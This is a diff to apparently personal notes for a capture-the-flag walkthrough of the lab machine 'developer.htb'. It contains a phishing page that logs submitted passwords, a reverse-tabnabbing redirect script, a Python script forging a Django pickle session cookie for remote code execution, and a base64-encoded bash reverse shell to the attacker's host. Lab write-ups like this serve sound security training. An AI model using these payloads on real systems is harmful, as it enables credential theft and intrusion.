@@ -1,3 +1,4 @@
+-- Until get a shell
 nmap & edit /etc/hosts -> <ip> developer.htb
 
 go to http://developer.htb/
@@ -17,9 +18,60 @@ sudo nc -nlvp 80 -> get callback
 
 --tabnab phishing
 wget -r http://developer.htb/accounts/login 
--> edit admin.html: delete any script tags, and add the dumping function in the end
+-> edit admin.html to admin.php, delete any script tags, and add the dumping function in the end
   <?php if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-  django cookie - <payload>:<time stamp>:<signature>
+      file_put_contents("dump.txt", $_SERVER['REMOTE_ADDR'] . ":" . $_POST['login'] . ":" . $_POST['password'] . "\n", FILE_APPEND)}; ?>
+
+Create <name>.html in developer.htb:
+<html>
+<script>
+if (window.opener) window.opener.location.replace("http://<my ip>/accounts/login/admin.php");
+if (window.parent != window) window.opener.parent.location.replace("http://<my ip>/accounts/login/admin.php");
+</script>
+</html>
+
+cd to developer.htb; sudo php -S <my ip>:80
+
+website: Submit walkthrough -> http://<my ip>/<name>.html -> wait and see POST logs -> cat dump.txt -> <admin password>
+
+login to http://developer.htb/admin/ -> sites: developer-sentry.developer.htb(add it on /etc/hosts), users: get user candidates 
+-> http://developer-sentry.developer.htb -> new login -> Lost your password?
+-> try users in user page -> Jacob@developer.htb works -> login with Jacob@developer.htb & <admin password>
+
+new project -> give name & save change -> settings -> remove project -> error page shows sensitive info(system.secret-key)
+-> ctrl+shift+i, get sentrysid
+   (django cookie format - <payload>:<time stamp>:<signature>)
+
+install python2.7, pip2, and pip2 install django
+Edit code in https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#!/usr/bin/python
+import django.core.signing, django.contrib.sessions.serializers
+from django.http import HttpResponse
+import cPickle
+import os
+
+SECRET_KEY='[RETRIEVEDKEY]'
+#Initial cookie I had on sentry when trying to reset a password
+cookie='gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1fjsBy:FdZ8oz3sQBnx2TPyncNt0LoyiAw'
+newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
+class PickleRce(object):
+    def __reduce__(self):
+        return (os.system,("sleep 30",))
+newContent['testcookie'] = PickleRce()
+
+print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+echo 'bash -i >& /dev/tcp/<my ip>/<my port> 0>&1' | base64 -> <base64 code>
+SECRET_KEY <- system.secret-key, cookie <- sentrysid, sleep 30 <- echo '<base64 code>' | base64 -d | bash
+nc -nlvp <my port>
+python2 <code>.py -> copy and paste it in sentrysid within "" -> refresh
+
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+ctrl + z -> stty rows -echo; fg
+export TERM=xterm # Can clear the shell with ctrl + l
+
+find / -iname config.py 
 
 sudo apt update
 sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev \
